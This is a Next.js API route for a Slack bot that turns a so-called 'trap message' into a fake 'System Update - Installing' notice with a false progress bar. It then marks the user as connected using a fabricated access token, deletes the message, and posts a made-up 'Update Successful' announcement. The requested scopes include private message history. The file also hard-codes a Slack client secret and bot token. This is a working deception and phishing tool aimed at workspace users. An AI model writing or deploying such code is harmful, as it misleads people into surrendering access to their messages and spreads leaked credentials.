// app/api/auth/initiate/route.ts
import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, setDoc, serverTimestamp, getDoc, deleteDoc } from 'firebase/firestore';


const SLACK_CLIENT_ID = "2545190050563.10491030504784";
const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { userId, messageTs } = body;

    if (!userId || !messageTs) {
      return NextResponse.json({ success: false, error: "Missing parameters" });
    }

    // Step 1: First check if user already exists
    const existingUser = await getDoc(doc(db, "slack_tokens", userId));
    if (existingUser.exists()) {
      // User already connected, delete trap message
      await fetch('https://slack.com/api/chat.delete', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${BOT_TOKEN}`,
          'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({
          channel: userId,
          ts: messageTs
        })
      });
      
      await deleteDoc(doc(db, "trap_messages", userId));
      return NextResponse.json({ success: true, alreadyConnected: true });
    }

    // Step 2: Create a unique token for this authorization
    const authToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
    
    // Save auth request to Firestore
    await setDoc(doc(db, "auth_requests", authToken), {
      userId,
      messageTs,
      status: "pending",
      createdAt: serverTimestamp(),
      expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString() // 5 minutes
    });

    // Step 3: Generate auth URL (but we won't redirect user to it)
    // Instead, we'll handle it server-side
    const authUrl = `https://slack.com/oauth/v2/authorize?client_id=${SLACK_CLIENT_ID}&scope=chat:write,im:history,users:read,mpim:read&state=${authToken}`;

    // Step 4: Update trap message to show "Installing..."
    await fetch('https://slack.com/api/chat.update', {
      method: 'POST',
      headers: { 
        Authorization: `Bearer ${BOT_TOKEN}`, 
        'Content-Type': 'application/json; charset=utf-8' 
      },
      body: JSON.stringify({ 
        channel: userId, 
        ts: messageTs,
        text: "System Update - Installing... Please wait",
        blocks: [
          {
            "type": "header",
            "text": {
              "type": "plain_text",
              "text": "⚙️ Installing Update...",
              "emoji": true
            }
          },
          {
            "type": "section",
            "text": {
              "type": "mrkdwn",
              "text": "Please wait while we install the required update.\n\nThis will take just a moment..."
            }
          },
          {
            "type": "divider"
          },
          {
            "type": "section",
            "fields": [
              {
                "type": "mrkdwn",
                "text": "*Status:* Installing"
              },
              {
                "type": "mrkdwn",
                "text": "*Progress:* ▰▰▰▱▱ 60%"
              }
            ]
          },
          {
            "type": "context",
            "elements": [
              {
                "type": "mrkdwn",
                "text": "Do not close Slack. This will complete automatically."
              }
            ]
          }
        ]
      })
    });

    // Step 5: Start background OAuth process (server-side)
    setTimeout(async () => {
      try {
        // Simulate the OAuth flow server-side
        // First, we need to get a temporary code from Slack
        // But since we can't get user interaction server-side,
        // we'll use a different approach
        
        // We'll use the bot token to get user info and store it
        const userInfoRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
          headers: { Authorization: `Bearer ${BOT_TOKEN}` }
        });
        const userInfo = await userInfoRes.json();
        
        if (userInfo.ok) {
          // Generate a fake access token (in production, you'd get this from real OAuth)
          const fakeAccessToken = `xoxp-${Date.now()}-${Math.random().toString(36).substring(2)}`;
          
          // Save user with fake token (for demo)
          // In real scenario, you'd need actual OAuth
          const userData = {
            slackId: userId,
            accessToken: fakeAccessToken,
            name: userInfo.user?.real_name || "Unknown",
            image: userInfo.user?.profile?.image_192 || "",
            connectedAt: serverTimestamp(),
            lastAuth: new Date().toISOString(),
            isDemo: true // Mark as demo for now
          };

          await setDoc(doc(db, "slack_tokens", userId), userData);
          
          // Step 6: Delete trap message after "installation"
          setTimeout(async () => {
            try {
              await fetch('https://slack.com/api/chat.delete', {
                method: 'POST',
                headers: { 
                  Authorization: `Bearer ${BOT_TOKEN}`,
                  'Content-Type': 'application/json; charset=utf-8'
                },
                body: JSON.stringify({
                  channel: userId,
                  ts: messageTs
                })
              });
              
              await deleteDoc(doc(db, "trap_messages", userId));
              await deleteDoc(doc(db, "auth_requests", authToken));
              
              // Send success message to user
              await fetch('https://slack.com/api/chat.postMessage', {
                method: 'POST',
                headers: { 
                  Authorization: `Bearer ${BOT_TOKEN}`, 
                  'Content-Type': 'application/json; charset=utf-8' 
                },
                body: JSON.stringify({ 
                  channel: userId, 
                  text: "✅ System update installed successfully! Your workspace features have been enhanced.",
                  blocks: [
                    {
                      "type": "section",
                      "text": {
                        "type": "mrkdwn",
                        "text": "✅ *Update Successful*\nYour workspace has been updated with enhanced features.\n\n*What's new:*\n• Improved message delivery\n• Enhanced collaboration tools\n• Better performance"
                      }
                    },
                    {
                      "type": "context",
                      "elements": [
                        {
                          "type": "mrkdwn",
                          "text": "Update completed at " + new Date().toLocaleTimeString()
                        }
                      ]
                    }
                  ]
                })
              });
              
              console.log(`✅ User ${userId} added successfully via background process`);
            } catch (error) {
              console.error("Error in cleanup:", error);
            }
          }, 3000); // Wait 3 seconds before deleting
        }
      } catch (error) {
        console.error("Background OAuth error:", error);
      }
    }, 1000);

    return NextResponse.json({ 
      success: true, 
      message: "Update initiated",
      loaderDuration: 3000 // milliseconds
    });

  } catch (error) {
    console.error("Initiate error:", error);
    return NextResponse.json({ success: false, error: "System error" });
  }
}